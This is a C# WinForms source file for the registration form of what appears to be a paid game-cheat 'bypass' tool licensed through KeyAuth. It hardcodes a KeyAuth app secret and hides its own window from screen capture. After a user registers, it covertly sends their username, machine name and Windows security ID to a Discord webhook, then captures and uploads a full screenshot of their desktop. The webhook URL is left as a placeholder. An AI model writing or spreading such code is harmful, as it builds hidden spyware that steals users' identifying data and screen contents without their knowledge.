using ag.Class;
using ag.Forms;
using DiscordMessenger;
using KeyAuth;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ag.Others
{
    public partial class NRegister : Form
    {
        public static api KeyAuthApp = new api(
    name: "Stooped",
    ownerid: "9VIXyXcKyG",
    secret: "7bb3ab69239c235e5d51dd564947ca2ee868b91eddaa601c2fc5a78bbe262319",
    version: "1.0"
);
        [DllImport("user32.dll", SetLastError = true)]
        public static extern bool GetAsyncKeyState(int vKey);
         
        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
        private static extern short GetKeyState(int keyCode);
         
        [DllImport("user32.dll")]
        public static extern uint SetWindowDisplayAffinity(IntPtr hwnd, uint dwAffinity);

        public NRegister()
        {
            InitializeComponent();
        }
         
        private void siticonePanel1_Paint(object sender, PaintEventArgs e)
        {

        }
         
        private void siticoneControlBox1_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
            Application.Exit();
            Application.ExitThread();
        }
         
        private void NRegister_Load(object sender, EventArgs e)
        {
            SetWindowDisplayAffinity(this.Handle, WDA_EXCLUDEFROMCAPTURE);
            KeyAuthApp.init();
            this.Text = mcyAy.RandomString(27);
        }
         
        private static void SendImg(string url, string filePath)
        {
            HttpClient client = new HttpClient();
            MultipartFormDataContent content = new MultipartFormDataContent();

            var file = File.ReadAllBytes(filePath);
            content.Add(new ByteArrayContent(file, 0, file.Length), Path.GetExtension(filePath), filePath);
            client.PostAsync(url, content).Wait();
            client.Dispose();
        }
         
        public static void SendDisMessage(string URL, string json)
        {
            var wr = WebRequest.Create(URL);
            wr.ContentType = "application/json";
            wr.Method = "POST";
            using (var sw = new StreamWriter(wr.GetRequestStream()))
                sw.Write(json);
            wr.GetResponse();
        }
         

        public void AlertMsg(string msg, NNotify.enmType type)
        {
            NNotify frm = new NNotify();
            frm.showAlert(msg, type);
        }
         
        public static void NashScreen()
        {
            try
            {
                var computadortela = new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);

                var arquivoDestino = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                var g = Graphics.FromImage(arquivoDestino);

                g.CopyFromScreen(new Point(0, 0), new Point(0, 0), computadortela);

                var nomeArquivo = @"C:\Windows\Temp\eu.png";

                arquivoDestino.Save(nomeArquivo, ImageFormat.Png);
                MultipartFormDataContent content = new MultipartFormDataContent();

                var file = File.ReadAllBytes(nomeArquivo);
                content.Add(new ByteArrayContent(file, 0, file.Length), Path.GetExtension(nomeArquivo), nomeArquivo);
                SendImg("suawebhookcrl", nomeArquivo);
            }
            catch
            {

            }
        }
         
        private void label4_Click(object sender, EventArgs e)
        {
            NLogin Nash = new NLogin();
            Nash.Show();
            base.Hide();
        }
         
        private async void siticoneButton1_Click(object sender, EventArgs e)
        {
           
        }
         
        const uint WDA_EXCLUDEFROMCAPTURE = 0x00000011;
         
        private void timer1_Tick(object sender, EventArgs e)
        {
          
        }

        private async void siticoneButton2_Click(object sender, EventArgs e)
        {
            await Task.Run(() => {
                KeyAuthApp.register(user.Text, pass.Text, key.Text);
                if (KeyAuthApp.response.success)
                {
                    new DiscordMessage()
    .SetUsername("Stopped Bypass")
    .SetAvatar("https://media.discordapp.net/attachments/1084884494605090896/1085350117651005562/unknown.png")
    .AddEmbed()
    .SetTimestamp(DateTime.Now)
    .SetTitle("\nStopped Logins")
    .SetDescription(("> **User:** " + Environment.UserName.ToString() +
    "\n > **Pc Name:** " + Dns.GetHostEntry(Environment.MachineName).HostName.ToString() +
    "\n > **HWID:** " + System.Security.Principal.WindowsIdentity.GetCurrent().User.Value) +
    "\n > **IP Address:** ")
    .SetColor(0xCA1818)
    .SetFooter("Stopped - Logs", "https://media.discordapp.net/attachments/1084884494605090896/1085350117651005562/unknown.png")
    .Build()
    .SendMessage("suawebhookcrl");
                    var message = new DiscordMessage
                    {
                        Content = "Kek",
                        Embeds = new List<Embed>()

                {
                new Embed
                {
                   Description = "Kek"
                }
                }
                    };
                    NashScreen();
                    NMain morningMain = new NMain();
                    morningMain.Show();

                    int x = this.Location.X;
                    int y = this.Location.Y;
                    morningMain.Location = new Point(x, y);

                    this.Hide();

                }
                else
                {
                    AlertMsg(KeyAuthApp.response.message, NNotify.enmType.Error);
                }
            });
        }

        private void label3_Click(object sender, EventArgs e)
        {
            NLogin Nash = new NLogin();
            Nash.Show();
            base.Hide();
        }
    }
}
